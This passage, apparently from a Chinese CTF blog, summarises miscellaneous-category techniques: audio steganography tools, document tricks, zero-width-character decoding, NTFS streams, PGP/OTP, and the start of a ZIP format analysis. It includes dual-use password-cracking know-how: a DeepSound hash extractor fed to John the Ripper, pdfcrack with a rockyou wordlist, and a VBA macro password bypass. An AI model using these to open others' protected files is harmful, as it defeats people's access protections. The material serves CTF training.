1.5\n\ntdd : TTY/TDD 45.45 bps −−baudot −−stopbits 2.0\n\nsame : SAME 520.83 bps −−startbits 0 −−stopbits 0 −−sync-byte 0xAB NOAA Specific Area Message Encoding (SAME) protocol\n\ncallerid : Bell202 1200 bps Caller-ID (MDMF or SDMF) protocol\n\nuic-train : UIC-751-3 600 bps train-to-ground message protocol\n\nuic-ground : UIC-751-3 600 bps ground-to-train message protocol\n```\n\n[官方手册](http://www.whence.com/minimodem/minimodem.1.html)\n\n\n## 0x05 DeepSound(需要passwd)\n\nwindows软件\n\n![](/img/summary/misc/DeepSound.jpg)\n\n部分题目的密码需要用[deepsound2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/deepsound2john.py)爆破\n\n```python\n#!/usr/bin/env python3\n'''\ndeepsound2john extracts password hashes from audio files containing encrypted\ndata steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).\n\nThis method is known to work with files created by DeepSound 2.0.\n\nInput files should be in .wav format. Hashes can be recovered from audio files\neven after conversion from other formats, e.g.,\n\n    ffmpeg -i input output.wav\n\nUsage:\n\n    python3 deepsound2john.py carrier.wav > hashes.txt\n    john hashes.txt\n\nThis software is copyright (c) 2018 Ryan Govostes <rgovostes@gmail.com>, and\nit is hereby released to the general public under the following terms:\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted.\n'''\n\nimport logging\nimport os\nimport sys\nimport textwrap\n\n\ndef decode_data_low(buf):\n  return buf[::2]\n\ndef decode_data_normal(buf):\n  out = bytearray()\n  for i in range(0, len(buf), 4):\n    out.append((buf[i] & 15) << 4 | (buf[i + 2] & 15))\n  return out\n\ndef decode_data_high(buf):\n  out = bytearray()\n  for i in range(0, len(buf), 8):\n    out.append((buf[i] & 3) << 6     | (buf[i + 2] & 3) << 4 \\\n             | (buf[i + 4] & 3) << 2 | (buf[i + 6] & 3))\n  return out\n\n\ndef is_magic(buf):\n  # This is a more efficient way of testing for the `DSCF` magic header without\n  # decoding the whole buffer\n  return (buf[0] & 15)  == (68 >> 4) and (buf[2]  & 15) == (68 & 15) \\\n     and (buf[4] & 15)  == (83 >> 4) and (buf[6]  & 15) == (83 & 15) \\\n     and (buf[8] & 15)  == (67 >> 4) and (buf[10] & 15) == (67 & 15) \\\n     and (buf[12] & 15) == (70 >> 4) and (buf[14] & 15) == (70 & 15)\n\n\ndef is_wave(buf):\n  return buf[0:4] == b'RIFF' and buf[8:12] == b'WAVE'\n\n\ndef process_deepsound_file(f):\n  bname = os.path.basename(f.name)\n  logger = logging.getLogger(bname)\n\n  # Check if it's a .wav file\n  buf = f.read(12)\n  if not is_wave(buf):\n    global convert_warn\n    logger.error('file not in .wav format')\n    convert_warn = True\n    return\n  f.seek(0, os.SEEK_SET)\n\n  # Scan for the marker...\n  hdrsz = 104\n  hdr = None\n\n  while True:\n    off = f.tell()\n    buf = f.read(hdrsz)\n    if len(buf) < hdrsz: break\n\n    if is_magic(buf):\n          hdr = decode_data_normal(buf)\n          logger.info('found DeepSound header at offset %i', off)\n          break\n\n    f.seek(-hdrsz + 1, os.SEEK_CUR)\n\n  if hdr is None:\n    logger.warn('does not appear to be a DeepSound file')\n    return\n\n  # Check some header fields\n  mode = hdr[4]\n  encrypted = hdr[5]\n\n  modes = {2: 'low', 4: 'normal', 8: 'high'}\n  if mode in modes:\n    logger.info('data is encoded in %s-quality mode', modes[mode])\n  else:\n    logger.error('unexpected data encoding mode %i', modes[mode])\n    return\n\n  if encrypted == 0:\n    logger.warn('file is not encrypted')\n    return\n  elif encrypted != 1:\n    logger.error('unexpected encryption flag %i', encrypted)\n    return\n\n  sha1 = hdr[6:6+20]\n  print('%s:$dynamic_1529$%s' % (bname, sha1.hex()))\n\n\nif __name__ == '__main__':\n  import argparse\n\n  parser = argparse.ArgumentParser()\n  parser.add_argument('--verbose', '-v', action='store_true')\n  parser.add_argument('files', nargs='+', metavar='file',\n    type=argparse.FileType('rb', bufsize=4096))\n  args = parser.parse_args()\n\n  if args.verbose:\n    logging.basicConfig(level=logging.INFO)\n  else:\n    logging.basicConfig(level=logging.WARN)\n\n  convert_warn = False\n\n  for f in args.files:\n    process_deepsound_file(f)\n\n  if convert_warn:\n    print(textwrap.dedent('''\n    ---------------------------------------------------------------\n    Some files were not in .wav format. Try converting them to .wav\n    and try again. You can use: ffmpeg -i input output.wav\n    ---------------------------------------------------------------\n    '''.rstrip()), file=sys.stderr)\n```\n\n用法\n\n```bash\npython3 deepsound2john.py carrier.wav > hashes.txt\njohn hashes.txt\n```\n\n## 0x06 dtmf\n\n>双音多频信号（Dual-Tone Multi-Frequency, DTMF），电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。\n>双音多频的拨号键盘是4×4的矩阵，每一行代表一个高频，每一列代表一个低频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹（Hz）。交换机可以解码这些频率组合并确定所对应的按键。\n>（来自维基百科）\n\n![](/img/summary/misc/dtmf.jpg)\n\n\n命令识别：\n\n```bash\ndtmf2num xxx.wav\n```\n\n\n## 0x07 SSTV\n\n慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片\n\n可以通过`Robot36`app或者[SSTV Decoder](https://github.com/colaclanth/sstv)识别\n\n```bash\nsstv -d audio_file.wav -o result.png\n```\n\n## 0x08 openpuff(需要passwd)\n\nwindows软件\n\n需要三个8位密码解密\n\n![](/img/summary/misc/openpuff.png)\n\n\n## 0x08 lyra\n\nlyra文件特征\n\n![](/img/summary/misc/lyra.png)\n\n安装步骤：\n\n```bash\n# 安装 Bazel 5.3.2\n\napt-get install pkg-config zip g++ zlib1g-dev unzip\nwget https://github.com/bazelbuild/bazel/releases/download/5.3.2/bazel-5.3.2-installer-linux-x86_64.sh\nchmod 777 bazel-5.3.2-installer-linux-x86_64.sh\n./bazel-5.3.2-installer-linux-x86_64.sh\n```\n\n```bash\n# 安装特定版本的clang\n\napt install ninja-build git cmake clang\ngit clone https://github.com/llvm/llvm-project.git\ncd llvm-project\ngit checkout 96ef4f307df2\nmkdir build_clang\ncd build_clang\ncmake -G Ninja -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ -DLLVM_ENABLE_PROJECTS=\"clang\" -DCMAKE_BUILD_TYPE=release ../llvm\nninja\nsudo $(which ninja) install\nsudo ldconfig\n```\n\n```bash\n# 安装lyra\n\napt install python3-numpy\ngit cone https://github.com/google/lyra\ncd lyra/\nsed -i 's/com_github_gflags_gflags/gflags/g' WORKSPACE\nbazel build -c opt lyra/cli_example:decoder_main\n```\n\n\n用法\n\n`bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200`\n\n\n## 0x09 Silenteye(需要password)\n\nwav音频文件可能是silenteye隐写，可以拿silenteye用默认密码解密试试\n\n当然如果已知密钥的话就用密钥去解密\n\n\n# 文档类\n\n## 0x01 VBA宏密码破解\n\n将`CMG=`替换为`CMG.`，`DPB=`替换为`DPB.` ，`GC=`替换为`GC.`\n\n`alt+F11`打开vba编辑器\n\n## 0x02 字体隐藏\n\n在字体的效果中勾选隐藏选项即可隐藏字符(或者采用了白色字体)\n\n![](/img/summary/misc/word-1.png)\n\n## 0x03 图片隐藏\n\n把后缀改为`zip`解压，在`media`目录下可以看到文档的所有图片(不排除故意放在其他目录中)\n\n## 0x04 pdf文件\n\n使用福昕编辑器等即可编辑，或者可以尝试转换成`docx`\n\n1、直接binwalk或者foremost提取出隐藏文件\n\n2、可能是wbStego4open隐写(需要password)\n\n3、若PDF加密，可以尝试使用pdfcrack爆破一下密码（Ubuntu下可以直接 apt install）\n\n```bash\npdfcrack -f enc.pdf -w rockyou.txt\n```\n\n\n## 0x05 wbstego4\n\n适用于pdf和txt隐写\n\n\n## 0x06 密码爆破\n\n可以用`passware kit`等工具爆破\n\n![](/img/summary/misc/word-2.png)\n\n## 0x07 odttf转ttf\n\n当复制文档中的内容至notepad后与原内容不一样，多半是修改了字体\n\n[在线网站转换](https://somanchiu.github.io/odttf2ttf/js/demo)\n\npython转换\n\n```python\nimport os\n\nodttf_name = \"./1F513ACE-F8AD-4F84-9264-C7B38E1D8CB7.odttf\"\nodttf_path = os.path.abspath(odttf_name)\n\nwith open(odttf_path, \"rb\") as f:\n    data = f.read()\n\n# 获取文件名\nfile_name = os.path.splitext(odttf_path)[0].split(\"\\\\\")[-1].replace(\"-\", \"\")\n\n# 获取key\nkey = []\nfor i in range(len(file_name), 0, -2):\n    key.append(int(file_name[i-2:i], 16))\n\nwith open(\"./font2.ttf\", \"wb\") as f:\n    for i in range(32):\n        f.write(bytes([data[i] ^ key[i % len(key)]]))\n    f.write(data[32:])\n```\n\n转换前先修改`xxx.odttf`文件名为对应的`fontKey`值(/word/fontTable.xml)\n\n![](/img/summary/misc/odttf.png)\n\n\n[FontDrop](https://fontdrop.info/#/?darkmode=true)或fontforge识别ttf即可\n\n\n## 0x08 行距隐写\n\nword中可能有一段是1倍行距，可能又有一段是1.5倍行距\n\n根据不同行距可以转成摩斯电码\n\n\n\n# 其他\n\n## 0x01 零宽字符隐写\n\n零宽度字符隐写术（Zero-Width Space Steganography），将隐藏消息编码和解码为不可打印/可读字符。\n\n```text\n字符包括：\n零宽度空格（\\u200b）\n零宽度非连接符（\\u200c）\n零宽度连接符（\\u200d）\n从左至右书写标记（\\u200e）\n从右至左书写标记（\\u200f）\n```\n\n在线解密工具\n[https://www.mzy0.com/ctftools/zerowidth1/](https://www.mzy0.com/ctftools/zerowidth1/)\n[http://330k.github.io/misc_tools/unicode_steganography.html](http://330k.github.io/misc_tools/unicode_steganography.html)\n[https://offdev.net/demos/zwsp-steg-js](https://offdev.net/demos/zwsp-steg-js)\n[https://yuanfux.github.io/zero-width-web/](https://yuanfux.github.io/zero-width-web/)\n[http://www.atoolbox.net/Tool.php?Id=829](http://www.atoolbox.net/Tool.php?Id=829)\n\npython解密\n[https://github.com/enodari/zwsp-steg-py](https://github.com/enodari/zwsp-steg-py)\n\njs解密\n\n```js\n/**\n *  Zero-Width Unicode Character Steganography\n *  Copyright (c) 2015-2016 Kei Misawa\n *  This software is released under the MIT License.\n *  http://opensource.org/licenses/mit-license.php\n */\n(function(exports){\n  'use strict';\n  var chars = [];\n  var radix = 0;\n  var codelengthText = 0;\n  var codelengthBinary = 0;\n  /**\n    Set characters of coded hidden text(zero width characters)\n    args: string of zero width characters\n    return: null\n   */\n  var setUseChars = function(newchars){\n    if(newchars.length >= 2){\n      chars = newchars.split('');\n      radix = chars.length;\n      codelengthText = Math.ceil(Math.log(65536) / Math.log(radix));\n      codelengthBinary = Math.ceil(Math.log(256) / Math.log(radix));\n    }\n    return null;\n  };\n  /**\n    Text Encoder\n    args:\n      text: original text to be embedded (String)\n      data: text to be hidden (String)\n    return: unicode stego text\n   */\n  var encodeText = function(text1, text2){\n    return combine_shuffle_string(text1, encode_to_zerowidth_characters_text(text2), codelengthText);\n  };\n  /**\n    Binary Encoder\n    args:\n      text: original text to be embedded (String)\n      data: data to be hidden (Uint8Array)\n    return: unicode stego text\n   */\n  var encodeBinary = function(text, data){\n    return combine_shuffle_string(text, encode_to_zerowidth_characters_binary(data), codelengthBinary);\n  };\n\n  /**\n    Text Decoder\n    args: unicode text with steganography (String)\n    return: JavaScript Object {\n      originalText: original text (String),\n      hiddenText: hidden data (String)\n    }\n   */\n  var decodeText = function(text){\n    var splitted = split_zerowidth_characters(text);\n\n    return {\n      'originalText': splitted.originalText,\n      'hiddenText': decode_from_zero_width_characters_text(splitted.hiddenText, codelengthText)\n    };\n  };\n  /**\n    Binary Decoder\n    args: unicode text with steganography (String)\n    return: JavaScript Object {\n      originalText: original text (String),\n      hiddenData: hidden data (Uint8Array)\n    }\n   */\n  var decodeBinary = function(text){\n    var splitted = split_zerowidth_characters(text);\n\n    return {\n      'originalText': splitted.originalText,\n      'hiddenData': decode_from_zero_width_characters_binary(splitted.hiddenText)\n    };\n  };\n\n  setUseChars('\\u200c\\u200d\\u202c\\ufeff');\n\n  exports.unicodeSteganographer = {\n    encodeText: encodeText,\n    decodeText: decodeText,\n    encodeBinary: encodeBinary,\n    decodeBinary: decodeBinary,\n    setUseChars: setUseChars\n  };\n\n  /**\n    Internal Functions\n  */\n  var encode_to_zerowidth_characters_text = function(str1){\n    var result = new Array(str1.length);\n    var base = '';\n    var i;\n    var c;\n    var d;\n    var r;\n\n    //var base = '0'.repeat(codelength); // IE not support this method\n    for(i = 0; i < codelengthText; i++){\n      base += '0';\n    }\n\n    for(i = 0; i < str1.length; i++){\n      c = str1.charCodeAt(i);\n      d = c.toString(radix);\n\n      result[i] = (base + d).substr(-codelengthText);\n    }\n\n    r = result.join('');\n\n    for(i = 0; i < radix; i++){\n      r = r.replace(new RegExp(i, 'g'), chars[i]);\n    }\n\n    return r;\n  };\n  var encode_to_zerowidth_characters_binary = function(u8ary){\n    var result = new Array(u8ary.length);\n    var base = '';\n    var i;\n    var c;\n    var d;\n    var r;\n\n    for(i = 0; i < codelengthBinary; i++){\n      base += '0';\n    }\n\n    for(i = 0; i < u8ary.length; i++){\n      d = u8ary[i].toString(radix);\n      result[i] = (base + d).substr(-codelengthBinary);\n    }\n\n    r = result.join('');\n\n    for(i = 0; i < radix; i++){\n      r = r.replace(new RegExp(i, 'g'), chars[i]);\n    }\n\n    return r;\n  };\n  var combine_shuffle_string = function(str1, str2, codelength){\n    var result = [];\n    var c0 = str1.split(/([\\u0000-\\u002F\\u003A-\\u0040\\u005b-\\u0060\\u007b-\\u007f])|([\\u0030-\\u0039]+)|([\\u0041-\\u005a\\u0061-\\u007a]+)|([\\u0080-\\u00FF]+)|([\\u0100-\\u017F]+)|([\\u0180-\\u024F]+)|([\\u0250-\\u02AF]+)|([\\u02B0-\\u02FF]+)|([\\u0300-\\u036F]+)|([\\u0370-\\u03FF]+)|([\\u0400-\\u04FF]+)|([\\u0500-\\u052F]+)|([\\u0530-\\u058F]+)|([\\u0590-\\u05FF]+)|([\\u0600-\\u06FF]+)|([\\u0700-\\u074F]+)|([\\u0750-\\u077F]+)|([\\u0780-\\u07BF]+)|([\\u07C0-\\u07FF]+)|([\\u0800-\\u083F]+)|([\\u0840-\\u085F]+)|([\\u08A0-\\u08FF]+)|([\\u0900-\\u097F]+)|([\\u0980-\\u09FF]+)|([\\u0A00-\\u0A7F]+)|([\\u0A80-\\u0AFF]+)|([\\u0B00-\\u0B7F]+)|([\\u0B80-\\u0BFF]+)|([\\u0C00-\\u0C7F]+)|([\\u0C80-\\u0CFF]+)|([\\u0D00-\\u0D7F]+)|([\\u0D80-\\u0DFF]+)|([\\u0E00-\\u0E7F]+)|([\\u0E80-\\u0EFF]+)|([\\u0F00-\\u0FFF]+)|([\\u1000-\\u109F]+)|([\\u10A0-\\u10FF]+)|([\\u1100-\\u11FF]+)|([\\u1200-\\u137F]+)|([\\u1380-\\u139F]+)|([\\u13A0-\\u13FF]+)|([\\u1400-\\u167F]+)|([\\u1680-\\u169F]+)|([\\u16A0-\\u16FF]+)|([\\u1700-\\u171F]+)|([\\u1720-\\u173F]+)|([\\u1740-\\u175F]+)|([\\u1760-\\u177F]+)|([\\u1780-\\u17FF]+)|([\\u1800-\\u18AF]+)|([\\u18B0-\\u18FF]+)|([\\u1900-\\u194F]+)|([\\u1950-\\u197F]+)|([\\u1980-\\u19DF]+)|([\\u19E0-\\u19FF]+)|([\\u1A00-\\u1A1F]+)|([\\u1A20-\\u1AAF]+)|([\\u1AB0-\\u1AFF]+)|([\\u1B00-\\u1B7F]+)|([\\u1B80-\\u1BBF]+)|([\\u1BC0-\\u1BFF]+)|([\\u1C00-\\u1C4F]+)|([\\u1C50-\\u1C7F]+)|([\\u1CC0-\\u1CCF]+)|([\\u1CD0-\\u1CFF]+)|([\\u1D00-\\u1D7F]+)|([\\u1D80-\\u1DBF]+)|([\\u1DC0-\\u1DFF]+)|([\\u1E00-\\u1EFF]+)|([\\u1F00-\\u1FFF]+)|([\\u2000-\\u206F]+)|([\\u2070-\\u209F]+)|([\\u20A0-\\u20CF]+)|([\\u20D0-\\u20FF]+)|([\\u2100-\\u214F]+)|([\\u2150-\\u218F]+)|([\\u2190-\\u21FF]+)|([\\u2200-\\u22FF]+)|([\\u2300-\\u23FF]+)|([\\u2400-\\u243F]+)|([\\u2440-\\u245F]+)|([\\u2460-\\u24FF]+)|([\\u2500-\\u257F]+)|([\\u2580-\\u259F]+)|([\\u25A0-\\u25FF]+)|([\\u2600-\\u26FF]+)|([\\u2700-\\u27BF]+)|([\\u27C0-\\u27EF]+)|([\\u27F0-\\u27FF]+)|([\\u2800-\\u28FF]+)|([\\u2900-\\u297F]+)|([\\u2980-\\u29FF]+)|([\\u2A00-\\u2AFF]+)|([\\u2B00-\\u2BFF]+)|([\\u2C00-\\u2C5F]+)|([\\u2C60-\\u2C7F]+)|([\\u2C80-\\u2CFF]+)|([\\u2D00-\\u2D2F]+)|([\\u2D30-\\u2D7F]+)|([\\u2D80-\\u2DDF]+)|([\\u2DE0-\\u2DFF]+)|([\\u2E00-\\u2E7F]+)|([\\u2E80-\\u2EFF]+)|([\\u2F00-\\u2FDF]+)|([\\u2FF0-\\u2FFF]+)|([\\u3000-\\u303F]+)|([\\u3040-\\u309F]+)|([\\u30A0-\\u30FF]+)|([\\u3100-\\u312F]+)|([\\u3130-\\u318F]+)|([\\u3190-\\u319F]+)|([\\u31A0-\\u31BF]+)|([\\u31C0-\\u31EF]+)|([\\u31F0-\\u31FF]+)|([\\u3200-\\u32FF]+)|([\\u3300-\\u33FF]+)|([\\u3400-\\u4DBF]+)|([\\u4DC0-\\u4DFF]+)|([\\u4E00-\\u9FFF]+)|([\\uA000-\\uA48F]+)|([\\uA490-\\uA4CF]+)|([\\uA4D0-\\uA4FF]+)|([\\uA500-\\uA63F]+)|([\\uA640-\\uA69F]+)|([\\uA6A0-\\uA6FF]+)|([\\uA700-\\uA71F]+)|([\\uA720-\\uA7FF]+)|([\\uA800-\\uA82F]+)|([\\uA830-\\uA83F]+)|([\\uA840-\\uA87F]+)|([\\uA880-\\uA8DF]+)|([\\uA8E0-\\uA8FF]+)|([\\uA900-\\uA92F]+)|([\\uA930-\\uA95F]+)|([\\uA960-\\uA97F]+)|([\\uA980-\\uA9DF]+)|([\\uA9E0-\\uA9FF]+)|([\\uAA00-\\uAA5F]+)|([\\uAA60-\\uAA7F]+)|([\\uAA80-\\uAADF]+)|([\\uAAE0-\\uAAFF]+)|([\\uAB00-\\uAB2F]+)|([\\uAB30-\\uAB6F]+)|([\\uAB70-\\uABBF]+)|([\\uABC0-\\uABFF]+)|([\\uAC00-\\uD7AF]+)|([\\uD7B0-\\uD7FF]+)|([\\uD800-\\uDFFF]+)|([\\uE000-\\uF8FF]+)|([\\uF900-\\uFAFF]+)|([\\uFB00-\\uFB4F]+)|([\\uFB50-\\uFDFF]+)|([\\uFE00-\\uFE0F]+)|([\\uFE10-\\uFE1F]+)|([\\uFE20-\\uFE2F]+)|([\\uFE30-\\uFE4F]+)|([\\uFE50-\\uFE6F]+)|([\\uFE70-\\uFEFF]+)|([\\uFF00-\\uFFEF]+)|([\\uFFF0-\\uFFFF]+)/g);\n    var c1 = [];\n    var i;\n    var j;\n    for(i = 0; i < c0.length; i++){\n      if((typeof c0[i] !== 'undefined') && (c0[i] !== '')){\n        c1.push(c0[i]);\n      }\n    }\n    var c2 = str2.split(new RegExp('(.{' + codelength + '})', 'g'));\n    var ratio = c1.length / (c1.length + c2.length);\n\n    /* slow\n    while((c1.length > 0) && (c2.length > 0)){\n      if(Math.random() <= ratio){\n        result.push(c1.shift());\n      }else{\n        result.push(c2.shift());\n      }\n    }*/\n    i = 0;\n    j = 0;\n    while((i < c1.length) && (j < c2.length)){\n      if(Math.random() <= ratio){\n        result.push(c1[i]);\n        i++;\n      }else{\n        result.push(c2[j]);\n        j++;\n      }\n    }\n    c1 = c1.slice(i);\n    c2 = c2.slice(j);\n\n    result = result.concat(c1).concat(c2);\n\n    return result.join('');\n  };\n  var split_zerowidth_characters = function(str1){\n    var result = {};\n    result.originalText = str1.replace(new RegExp('[' + chars.join('') + ']', 'g'), '');\n    result.hiddenText = str1.replace(new RegExp('[^' + chars.join('') + ']', 'g'), '');\n\n    return result;\n  };\n  var decode_from_zero_width_characters_text = function(str1){\n    var r = str1;\n    var i;\n    var result = [];\n    for(i = 0; i < radix; i++){\n      r = r.replace(new RegExp(chars[i], 'g'), i);\n    }\n    for(i = 0; i < r.length; i += codelengthText){\n      result.push(String.fromCharCode(parseInt(r.substr(i, codelengthText), radix)));\n    }\n\n    return result.join('');\n  };\n  var decode_from_zero_width_characters_binary = function(str1){\n    var r = str1;\n    var i;\n    var j;\n    var result = new Uint8Array(Math.ceil(str1.length / codelengthBinary));\n\n    for(i = 0; i < radix; i++){\n      r = r.replace(new RegExp(chars[i], 'g'), i);\n    }\n    for(i = 0, j = 0; i < r.length; i += codelengthBinary, j++){\n      result[j] = parseInt(r.substr(i, codelengthBinary), radix);\n    }\n\n    return result;\n  };\n\n  return null;\n})(this);\n\n\nvar s = unicodeSteganographer\ns.setUseChars('\\u200b\\u200c\\u200d\\u200e\\u200f');\ns.decodeText(\"我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？\")\n\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/\n```\n\n## 0x02 ntfs数据流隐写\n\n>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科\n\n创建一个NTFS数据流\n\n`echo \"test\" > 1.txt:2.txt`\n\n查看数据流\n使用`NtfsStreamsEditor`(windows)工具或者`notepad`命令\n\n![](/img/summary/misc/ntfs.jpg)\n\n## 0x03 pyc文件反编译\n\n一般使用`uncompyle6`\n\n`uncompyle6 test.pyc > test.py`\n\n## 0x04 pyc隐写\n\nStegosaurus 是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload\n\ngithub项目说是`Python 3.6 or later`，但是实际使用发现只有Python3.6可以运行\n\n\n```bash\npython3 stegosaurus.py -x [pyc_file]\n```\n\n有时候需要注意`magic number`的问题\npython3.6以下magic number是12个字节；python3.7以上是16个字节\n\n\n## 0x05 Tupper自我指涉公式\n\n塔珀自指公式是杰夫·塔珀（Jeff Tupper）发现的自指公式：此公式的二维图像与公式本身外观一样。\n该公式是一种对存储在常量k 中的位图信息进行解码的通用方法 ，它实际上可以用来绘制任何其他图像。\n\n\n该不等式的定义为：\n\n![](/img/summary/misc/Tupper.jpg)\n\n其中 ⌊ ⌋ 表示楼层函数， mod 是模运算\n\n根据k值不同，可以做出\"任意\"图像\n\n[Tupper's Formula Tools](https://tuppers-formula.ovh/)\n\n```python\nfrom functools import reduce\n\n\ndef Tuppers_Self_Referential_Formula():\n    k = 4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300\n    # 这里替换为你自己的K值\n\n    def f(x, y):\n        d = ((-17 * x) - (y % 17))\n        e = reduce(lambda x, y: x * y, [2 for x in range(-d)]) if d else 1\n        g = ((y // 17) // e) % 2\n        return 0.5 < g\n\n    for y in range(k + 16, k - 1, -1):\n        line = \"\"\n        for x in range(0, 107):\n            if f(x, y):\n                line += \" ■\"\n            else:\n                line += \"  \"\n        print(line)\n\n\nif __name__ == '__main__':\n    Tuppers_Self_Referential_Formula()\n```\n\n题目通常会给一个0-9组成的十进制长整数\n\n>曾遇到一道题目给出的提示：数字映射函数。就是使用Tupper自我指涉公式画图\n\n\n## 0x06 snow隐写\n\nsnow 隐写是在html嵌入隐写信息，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。\n\nsnow加密的特征非常明显，它会生成大量的`20`，`09`，在预览的时候像雪花一样\n\n![](/img/summary/misc/snow.png)\n\n[snow在线](http://fog.misty.com/perry/ccs/snow/snow/snow.html)\n\n```bash\nsnow.exe -C -p password filename\n```\n\n## 0x07 whitespace\n\nwhite_space是一种编程语言\n由\"空格\"，\"回车\"，\"tab\"组成\n\n[whitespace ide](https://vii5ard.github.io/whitespace/)\n\n\n## 0x08 PGP\n\n>PGP 加密系统是采用公开密钥加密与传统密钥加密相结合的一种加密技术。它使用一对数学上相关的钥匙，其中一个（公钥）用来加密信息，另一个（私钥）用来解密信息。\n\n一般需要私钥文件`xxx.key`或`xxx.asc`，加密文件`xxx.pgp`和一个密码\n\nPGPTool: https://pgptool.github.io/\n\n例如[BSidesSF2019]bWF0cnlvc2hrYQ==\n\n`Key ring->Import PGP Key->导入xxx.key->然后输入密码`\n\n![](/img/summary/misc/pgp.jpg)\n\n## 0x09 otp\n\n有点偏向密码学，[wiki](https://en.wikipedia.org/wiki/One-time_password)\n\n一次性密码（One Time Password，简称 OTP），又称 “一次性口令”，是指只能使用一次的密码。\n\nOTP 的密钥是以 base32 的方式存储的\n\npython中有一个[pyotp库](https://pypi.org/project/pyotp/)可以处理它\n\n```python\n#Time-based OTPs\nimport pyotp\nimport time\n\ntotp = pyotp.TOTP('base32secret3232')\ntotp.now() # => '492039'\n\n\ntotp.verify('492039') # => True\ntime.sleep(30)\ntotp.verify('492039') # => False\n\n\n#Counter-based OTPs\nimport pyotp\n\nhotp = pyotp.HOTP('base32secret3232')\nhotp.at(0) # => '260182'\nhotp.at(1) # => '055283'\nhotp.at(1401) # => '316439'\n\nhotp.verify('316439', 1401) # => True\nhotp.verify('316439', 1402) # => False\n\n\n\n#Generating a Secret Key\npyotp.random_base32()\npyotp.random_hex()\n```\n\n## 0x10 数控打印\n\n遇到`*.gcode`文件或者`3D打印gcode的命令`可以放到下面这两个网站解析\n\n[ncviewer](https://ncviewer.com/)\n[gCodeViewer](https://gcode.ws/)\n\n![](/img/summary/misc/shukong.jpg)\n\n\n## 0x11 Dicom图像\n\nx光图像\n\n后缀为`.dcm`的文件可以使用`MicroDicom`打开\n\n\n## 0x12 垃圾邮件(spammimic)\n\n例如 2023NKCTF-first spam of rabbit year\n\n特点是一份看上去没什么意义的邮件\n\n[在线解密](https://www.spammimic.com/)","tags":["总结","misc","隐写"],"categories":["总结"]},{"title":"misc总结(压缩文件篇)","url":"/posts/ff5ac082/","content":"\n# ZIP文件 #\n\n`ZIP`通常使用后缀名`.zip`，它的`MIME`格式为`application/zip`\n\n## 文件结构分析 ##\n\n引用[官方文档](https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt)中对于一个标准zip文件组成部分的描述：\n\n```\n[local file header 1]\n[file data 1]\n[data descriptor 1]\n.\n.\n.\n[local file header n]\n[file data n]\n[data descriptor n]\n[archive decryption header] (EFS)\n[archive extra data record] (EFS)\n[central directory]\n[zip64 end of central directory record]\n[zip64 end of central directory locator]\n[end of central directory record]\n```\n\n为了演示结构，首先创建一个`flag.txt`，分别压缩成`flag1.zip(无密码)`和`flag2.zip(有密码)`（使用的是winrar默认参数压缩）\n\n推荐使用`010 editor`分析\n\n先看`flag1.zip`\n\n![](/img/summary/misc/misc-compress-1.png)\n\n\n大致可以分为三个部分：`local file header + file data + data descriptor`和`central directory`以及一个`end of central directory record`组成（对应图中的三种颜色）\n\n\n### 文件头(Local file header) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|Local file header signature|4|文件头标识，固定值(50 4B 03 04)|\n|Version needed to extract|2|解压文件所需的ZIP最低版本|\n|General purpose bit flag|2|通用位标志，通常只需要考虑当bit 0为1时表示文件被加密|\n|Compression method|2|压缩方式，当值为：0x0000时表示无压缩|\n|Last mod file time|2|文件最后修改时间，以standard MS-DOS格式编码|\n|Last mod file date|2|文件最后修改日期|\n|CRC-32|4|未压缩数据的CRC32|\n|Compressed size|4|压缩后的大小，单位为byte|\n|Uncompressed size|4|未压缩的大小|\n|File name length|2|文件名长度|\n|Extra field length|2|扩展区域长度|\n|File name|N|文件名|\n|Extra field|N|扩展区域\n\n\n### 文件数据(File data) ###\n\n应将文件的压缩或存储数据紧随在文件头(Local File Header)后。如果文件已加密，则文件的加密头(encryption header)应放置在本地文件头(Local File Header)之后和文件数据之前。\n\n对于`.ZIP`压缩文档中的每个文件，重复执行一系列的`[文件头][加密头][文件数据][数据描述符]`结构。\n\n\n### 数据描述符(Data descriptor) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|Optional data descriptor signature|4|(可选的)数据描述符标识，固定值(50 4B 07 08)|\n|CRC-32|4|未压缩数据的CRC32|\n|Compressed size|4|压缩后的大小|\n|Uncompressed size|4|未压缩的大小|\n\n如果设置了通用位标志的位3，则该描述符必须存在，它按字节对齐，紧随压缩数据的最后一个字节，仅在无法在输出的.ZIP文件中查找时(例如，当输出.ZIP文件是标准输出或不可搜索的设备时)，才应使用此描述符\n\n例如`flag2.zip`中的绿色部分\n\n![](/img/summary/misc/misc-compress-2.png)\n\n\n### 